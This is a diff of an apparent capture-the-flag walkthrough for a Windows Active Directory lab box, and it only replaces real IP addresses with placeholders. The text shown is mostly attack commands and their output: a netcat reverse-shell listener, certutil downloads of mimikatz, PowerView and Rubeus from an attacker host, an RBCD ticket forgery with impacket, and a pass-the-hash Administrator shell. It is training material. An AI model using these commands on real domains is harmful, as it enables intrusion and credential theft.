@@ -58,7 +58,7 @@ j.arbuckle
 
 | Item | Value |
 |---|---|
-| Target IP | `10.129.20.167` |
+| Target IP | `<TARGET_IP>` |
 | Domain | `garfield.htb` |
 | DC | `DC01.garfield.htb` |
 | Internal RODC | `RODC01.garfield.htb` / `192.168.100.2` |
@@ -71,8 +71,8 @@ j.arbuckle
 ## 1.1 Set Variables
 
 ```bash
-export TARGET_IP="10.129.20.167"
-export ATTACKER_IP="10.10.14.241"
+export TARGET_IP="<TARGET_IP>"
+export ATTACKER_IP="<YOUR_IP>"
 export DOMAIN="garfield.htb"
 export USER="j.arbuckle"
 export PASS='Th1sD4mnC4t!@1978'
@@ -127,11 +127,11 @@ nxc smb $TARGET_IP -u $USER -p "$PASS" --shares
 ### Output
 
 ```text
-SMB  10.129.20.167  445  DC01  [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
-SMB  10.129.20.167  445  DC01  Share      Permissions
-SMB  10.129.20.167  445  DC01  IPC$       READ
-SMB  10.129.20.167  445  DC01  NETLOGON   READ
-SMB  10.129.20.167  445  DC01  SYSVOL     READ
+SMB  <TARGET_IP>  445  DC01  [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
+SMB  <TARGET_IP>  445  DC01  Share      Permissions
+SMB  <TARGET_IP>  445  DC01  IPC$       READ
+SMB  <TARGET_IP>  445  DC01  NETLOGON   READ
+SMB  <TARGET_IP>  445  DC01  SYSVOL     READ
 ```
 
 ### Notes
@@ -231,7 +231,7 @@ nc -lvnp 9001
 ### Output
 
 ```text
-connect to [10.10.14.241] from (UNKNOWN) [10.129.20.167] 51335
+connect to [<YOUR_IP>] from (UNKNOWN) [<TARGET_IP>] 51335
 whoami
 garfield\l.wilson
 hostname
@@ -268,13 +268,13 @@ nxc winrm $TARGET_IP -u l.wilson_adm -p 'WhoKnows123!'
 ### Output
 
 ```text
-WINRM  10.129.20.167  5985  DC01  [+] garfield.htb\l.wilson_adm:WhoKnows123! (Pwn3d!)
+WINRM  <TARGET_IP>  5985  DC01  [+] garfield.htb\l.wilson_adm:WhoKnows123! (Pwn3d!)
 ```
 
 ## 5.3 Get a Shell as `l.wilson_adm`
 
 ```bash
-evil-winrm -i 10.129.20.167 -u l.wilson_adm -p 'WhoKnows123!'
+evil-winrm -i <TARGET_IP> -u l.wilson_adm -p 'WhoKnows123!'
 ```
 
 ### Output
@@ -366,7 +366,7 @@ INFO[0116] Agent joined. id=00155d0bdd00 name="GARFIELD\\l.wilson_adm@DC01"
 ## 8.3 Run Agent from WinRM
 
 ```powershell
-.\agent.exe -connect 10.10.14.241:11601 -ignore-cert
+.\agent.exe -connect <YOUR_IP>:11601 -ignore-cert
 ```
 
 ## 8.4 Add Route on Kali
@@ -409,13 +409,13 @@ SMB  192.168.100.2  445  RODC01  [+] garfield.htb\l.wilson_adm:WhoKnows123!
 impacket-addcomputer garfield.htb/l.wilson_adm:'WhoKnows123!' \
 -computer-name 'FAKE$' \
 -computer-pass 'FakePass123!' \
--dc-ip 10.129.20.167
+-dc-ip <TARGET_IP>
 ```
 
 ## 10.2 Verify
 
 ```bash
-nxc ldap 10.129.20.167 -u l.wilson_adm -p 'WhoKnows123!' --users | grep FAKE
+nxc ldap <TARGET_IP> -u l.wilson_adm -p 'WhoKnows123!' --users | grep FAKE
 ```
 
 ---
@@ -447,7 +447,7 @@ PrincipalsAllowedToDelegateToAccount : {CN=FAKE,CN=Computers,DC=garfield,DC=htb}
 impacket-getST garfield.htb/'FAKE$':'FakePass123!' \
 -spn cifs/RODC01.garfield.htb \
 -impersonate Administrator \
--dc-ip 10.129.20.167
+-dc-ip <TARGET_IP>
 ```
 
 ### Output
@@ -471,7 +471,7 @@ echo $KRB5CCNAME
 
 ```bash
 impacket-psexec -k -no-pass \
--dc-ip 10.129.20.167 \
+-dc-ip <TARGET_IP> \
 -target-ip 192.168.100.2 \
 garfield.htb/Administrator@RODC01.garfield.htb
 ```
@@ -508,7 +508,7 @@ python3 -m http.server 8888
 
 ```cmd
 cd C:\Windows\Temp
-certutil -urlcache -split -f http://10.10.14.241:8888/mimikatz.exe mimikatz.exe
+certutil -urlcache -split -f http://<YOUR_IP>:8888/mimikatz.exe mimikatz.exe
 mimikatz.exe
 ```
 
@@ -564,7 +564,7 @@ In WinRM:
 
 ```powershell
 cd C:\Users\l.wilson_adm\Desktop
-certutil -urlcache -split -f http://10.10.14.241:8888/PowerView.ps1 PowerView.ps1
+certutil -urlcache -split -f http://<YOUR_IP>:8888/PowerView.ps1 PowerView.ps1
 Set-ExecutionPolicy Bypass -Scope Process
 Import-Module .\PowerView.ps1
 Get-Command *DomainObject*
@@ -608,7 +608,7 @@ python3 -m http.server 8888
 In WinRM:
 
 ```powershell
-certutil -urlcache -split -f http://10.10.14.241:8888/Rubeus.exe Rubeus.exe
+certutil -urlcache -split -f http://<YOUR_IP>:8888/Rubeus.exe Rubeus.exe
 dir Rubeus.exe
 .\Rubeus.exe
 ```
@@ -734,7 +734,7 @@ ee238f6debc752010...................
 # 18. Final Administrator Shell and Root Flag
 
 ```bash
-evil-winrm -i 10.129.20.167 -u Administrator -H 'ee238f6debc752010428f20875b092d5'
+evil-winrm -i <TARGET_IP> -u Administrator -H 'ee238f6debc752010428f20875b092d5'
 ```
 
 Inside the shell:
